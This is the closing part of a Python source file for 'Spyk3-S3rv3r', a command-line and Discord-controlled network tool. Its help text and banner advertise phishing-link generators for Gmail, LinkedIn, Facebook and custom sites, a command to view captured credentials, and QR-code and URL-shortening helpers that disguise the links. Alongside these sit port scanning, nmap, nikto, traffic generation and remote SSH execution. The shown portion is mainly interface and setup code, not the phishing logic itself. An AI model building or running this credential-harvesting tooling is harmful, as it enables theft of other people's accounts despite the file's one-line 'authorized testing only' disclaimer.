`generate_phishing_link_for_gmail` - Gmail phishing link
`generate_phishing_link_for_linkedin` - LinkedIn phishing link
`generate_phishing_link_for_custom [url]` - Custom phishing link
`phishing_links` - List all phishing links
`phishing_credentials [id]` - View captured credentials
`phishing_qr <id>` - Generate QR code
`phishing_shorten <id>` - Shorten URL

**🔒 IP MANAGEMENT:**
`add_ip <ip> [notes]` - Add IP to monitoring
`remove_ip <ip>` - Remove IP from monitoring
`block_ip <ip> [reason]` - Block IP address
`unblock_ip <ip>` - Unblock IP address
`list_ips` - List managed IPs
`ip_info <ip>` - Detailed IP information

**🛡️ NETWORK COMMANDS:**
`ping <ip>` - Ping an IP address
`scan <ip>` - Scan ports 1-1000
`quick_scan <ip>` - Quick port scan
`nmap <ip> [options]` - Full nmap scan
`traceroute <target>` - Network path tracing
`whois <domain>` - WHOIS lookup
`location <ip>` - IP geolocation

**📊 SYSTEM COMMANDS:**
`system` - System information
`status` - System status
`threats` - Recent threats

**Examples:**
`analyze 8.8.8.8`
`stats 192.168.1.1`
`time`
`ssh_add myserver 192.168.1.100 root password123`
`ssh_exec myserver "ls -la"`
`generate_traffic icmp 192.168.1.1 10`
`nikto example.com`
`generate_phishing_link_for_facebook`
`add_ip 192.168.1.100 Suspicious`
`block_ip 10.0.0.5 Port scanning`

⚠️ **For authorized security testing only**
        """
        return self._create_result(True, help_text)

# =====================
# MAIN APPLICATION
# =====================
class Spyk3App:
    """Main application class"""
    
    def __init__(self):
        self.config = ConfigManager.load_config()
        self.db = DatabaseManager()
        self.ssh_manager = SSHManager(self.db, self.config)
        self.nikto = NiktoScanner(self.db, self.config.get('nikto', {}))
        self.traffic_gen = TrafficGeneratorEngine(self.db, self.config)
        self.ip_engine = IPAnalysisEngine(self.db, self.config)
        self.handler = CommandHandler(self.db, self.ssh_manager, self.nikto, self.traffic_gen, self.ip_engine)
        self.monitor = NetworkMonitor(self.db, self.config)
        self.discord_bot = Spyk3Discord(self.handler, self.db, self.monitor)
        self.session_id = self.db.create_session("local_user")
        self.running = True
    
    def print_banner(self):
        banner = f"""
{Colors.BLUE}╔═══════════════════════════════════════════════════════════════════════════╗
║{Colors.CYAN}                                                                           {Colors.BLUE}║
║{Colors.CYAN}                     🕷️ SPYK3-S3RV3R                                      {Colors.BLUE}║
║{Colors.CYAN}                                                                           {Colors.BLUE}║
║{Colors.CYAN}                                                                           {Colors.BLUE}║
╠═══════════════════════════════════════════════════════════════════════════╣
║{Colors.GREEN}  FEATURES:                                                              {Colors.BLUE}║
║{Colors.GREEN}  • analyze <ip> - Complete IP analysis with graphical reports           {Colors.BLUE}║
║{Colors.GREEN}  • stats <ip> - Generate statistical graphics                          {Colors.BLUE}║
║{Colors.GREEN}  • ssh <commands> - Remote SSH command execution                       {Colors.BLUE}║
║{Colors.GREEN}  • generate_traffic - REAL network traffic generation                  {Colors.BLUE}║
║{Colors.GREEN}  • nikto <target> - Web vulnerability scanning                         {Colors.BLUE}║
║{Colors.GREEN}  • generate_phishing_link - Social engineering tools                   {Colors.BLUE}║
║{Colors.GREEN}  • time/date commands with history tracking                            {Colors.BLUE}║
║{Colors.GREEN}  • Discord bot integration with 2000+ commands                         {Colors.BLUE}║
╚═══════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
        """
        print(banner)
    
    def check_dependencies(self):
        print(f"\n{Colors.BLUE}🔍 Checking dependencies...{Colors.RESET}")
        
        required_tools = ['ping', 'nmap', 'curl', 'dig', 'traceroute', 'ssh']
        missing = []
        
        for tool in required_tools:
            if shutil.which(tool):
                print(f"{Colors.GREEN}✅ {tool}{Colors.RESET}")
            else:
                print(f"{Colors.YELLOW}⚠️  {tool} not found{Colors.RESET}")
                missing.append(tool)
        
        try:
            import paramiko
            print(f"{Colors.GREEN}✅ paramiko (SSH){Colors.RESET}")
        except ImportError:
            print(f"{Colors.YELLOW}⚠️  paramiko not found - SSH features disabled{Colors.RESET}")
        
        if SCAPY_AVAILABLE:
            print(f"{Colors.GREEN}✅ scapy (advanced traffic){Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}⚠️  scapy not found - advanced traffic types disabled{Colors.RESET}")
        
        if GRAPHICS_AVAILABLE:
            print(f"{Colors.GREEN}✅ matplotlib (graphics){Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}⚠️  matplotlib not found - graphics generation disabled{Colors.RESET}")
        
        if PDF_AVAILABLE:
            print(f"{Colors.GREEN}✅ reportlab (PDF reports){Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}⚠️  reportlab not found - PDF reports disabled{Colors.RESET}")
        
        if QRCODE_AVAILABLE:
            print(f"{Colors.GREEN}✅ qrcode (QR generation){Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}⚠️  qrcode not found - QR code generation disabled{Colors.RESET}")
        
        if SHORTENER_AVAILABLE:
            print(f"{Colors.GREEN}✅ pyshorteners (URL shortening){Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}⚠️  pyshorteners not found - URL shortening disabled{Colors.RESET}")
        
        if DISCORD_AVAILABLE:
            print(f"{Colors.GREEN}✅ discord.py (Discord bot){Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}⚠️  discord.py not found - Discord bot disabled{Colors.RESET}")
        
        if missing:
            print(f"\n{Colors.YELLOW}⚠️  Some tools are missing. Install with:{Colors.RESET}")
            if platform.system().lower() == 'linux':
                print(f"  sudo apt-get install {' '.join(missing)}")
            elif platform.system().lower() == 'darwin':
                print(f"  brew install {' '.join(missing)}")
        
        print(f"\n{Colors.GREEN}✅ Dependencies check complete{Colors.RESET}")
    
    def setup_discord(self):
        print(f"\n{Colors.BLUE}🤖 Discord Bot Setup{Colors.RESET}")
        print(f"{Colors.BLUE}{'='*50}{Colors.RESET}")
        
        token = input(f"{Colors.CYAN}Enter Discord bot token (or press Enter to skip): {Colors.RESET}").strip()
        if not token:
            print(f"{Colors.YELLOW}⚠️  Discord setup skipped{Colors.RESET}")
            return
        
        channel_id = input(f"{Colors.CYAN}Enter channel ID for notifications (optional): {Colors.RESET}").strip()
        prefix = input(f"{Colors.CYAN}Enter command prefix (default: !): {Colors.RESET}").strip() or "!"
        admin_role = input(f"{Colors.CYAN}Enter admin role name (default: Admin): {Colors.RESET}").strip() or "Admin"
        security_role = input(f"{Colors.CYAN}Enter security team role name (default: Security Team): {Colors.RESET}").strip() or "Security Team"
        
        if self.discord_bot.save_config(token, channel_id, True, prefix, admin_role, security_role):
            print(f"{Colors.GREEN}✅ Discord configured!{Colors.RESET}")
            if self.discord_bot.start_bot_thread():
                print(f"{Colors.GREEN}✅ Discord bot started! Use '{prefix}help' in Discord{Colors.RESET}")
            else:
                print(f"{Colors.RED}❌ Failed to start Discord bot{Colors.RESET}")
        else:
            print(f"{Colors.RED}❌ Failed to save Discord configuration{Colors.RESET}")
    
    def process_command(self, command: str):
        if not command.strip():
            return
        
        self.db.update_session_activity(self.session_id)
        
        parts = command.strip().split()
        cmd = parts[0].lower()
        
        if cmd == 'help':
            result = self.handler.execute("help")
            print(result.get('output', ''))
        elif cmd == 'clear':
            os.system('cls' if os.name == 'nt' else 'clear')
            self.print_banner()
        elif cmd == 'exit':
            self.running = False
            print(f"\n{Colors.YELLOW}👋 Thank you for using Spyk3-S3rv3r!{Colors.RESET}")
        else:
            result = self.handler.execute(command)
            if result['success']:
                output = result.get('output', '') or result.get('data', '')
                if isinstance(output, dict):
                    print(json.dumps(output, indent=2))
                else:
                    print(output)
                print(f"\n{Colors.GREEN}✅ Command executed ({result['execution_time']:.2f}s){Colors.RESET}")
            else:
                print(f"\n{Colors.RED}❌ Command failed: {result.get('output', 'Unknown error')}{Colors.RESET}")
    
    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        
        self.check_dependencies()
        
        if not os.path.exists(CONFIG_FILE):
            print(f"\n{Colors.YELLOW}First time setup...{Colors.RESET}")
            
            setup_discord = input(f"{Colors.CYAN}Setup Discord bot? (y/n): {Colors.RESET}").strip().lower()
            if setup_discord == 'y':
                self.setup_discord()
            
            auto_monitor = input(f"{Colors.CYAN}Start threat monitoring automatically? (y/n): {Colors.RESET}").strip().lower()
            if auto_monitor == 'y':
                self.monitor.start_monitoring()
                print(f"{Colors.GREEN}✅ Threat monitoring started{Colors.RESET}")
        
        print(f"\n{Colors.GREEN}✅ Tool ready! Session ID: {self.session_id}{Colors.RESET}")
        print(f"{Colors.CYAN}   Type 'help' for commands or 'analyze <ip>' for IP analysis{Colors.RESET}")
        
        while self.running:
            try:
                prompt = f"{Colors.BLUE}[{Colors.CYAN}{self.session_id}{Colors.BLUE}]{Colors.CYAN} 🕷️> {Colors.RESET}"
                command = input(prompt).strip()
                self.process_command(command)
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}👋 Exiting...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.RED}❌ Error: {str(e)}{Colors.RESET}")
                logger.error(f"Command error: {e}")
        
        self.monitor.stop_monitoring()
        self.ssh_manager.disconnect()
        self.traffic_gen.stop_generation()
        self.db.end_session(self.session_id)
        self.db.close()
        
        print(f"\n{Colors.GREEN}✅ Tool shutdown complete.{Colors.RESET}")
        print(f"{Colors.CYAN}📁 Logs saved to: {LOG_FILE}{Colors.RESET}")
        print(f"{Colors.CYAN}💾 Database: {DATABASE_FILE}{Colors.RESET}")
        print(f"{Colors.CYAN}📊 Reports: {REPORT_DIR}{Colors.RESET}")

# =====================
# MAIN ENTRY POINT
# =====================
def main():
    """Main entry point"""
    try:
        print(f"{Colors.BLUE}🕷️ Starting Spyk3-S3rv3r v1.0.0...{Colors.RESET}")
        
        if sys.version_info < (3, 7):
            print(f"{Colors.RED}❌ Python 3.7 or higher is required{Colors.RESET}")
            sys.exit(1)
        
        required_packages = ['paramiko', 'cryptography']
        missing_packages = []
        
        for package in required_packages:
            try:
                __import__(package.replace('-', '_'))
            except ImportError:
                missing_packages.append(package)
        
        if missing_packages:
            print(f"{Colors.YELLOW}⚠️  Missing required packages: {', '.join(missing_packages)}{Colors.RESET}")
            print(f"{Colors.YELLOW}   Install with: pip install {' '.join(missing_packages)}{Colors.RESET}")
            print(f"{Colors.YELLOW}   Continuing with limited functionality...{Colors.RESET}")
        
        needs_admin = False
        if platform.system().lower() == 'linux':
            if os.geteuid() != 0:
                needs_admin = True
        elif platform.system().lower() == 'windows':
            try:
                if not ctypes.windll.shell32.IsUserAnAdmin():
                    needs_admin = True
            except:
                pass
        
        if needs_admin:
            print(f"{Colors.YELLOW}⚠️  Warning: Running without admin/root privileges{Colors.RESET}")
            print(f"{Colors.YELLOW}   Firewall operations (block_ip/unblock_ip) will not work{Colors.RESET}")
            print(f"{Colors.YELLOW}   Advanced traffic generation (raw packets) will be limited{Colors.RESET}")
            print(f"{Colors.YELLOW}   Run with sudo/administrator for full functionality{Colors.RESET}")
            time.sleep(2)
        
        app = Spyk3App()
        app.run()
    
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}❌ Fatal error: {str(e)}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()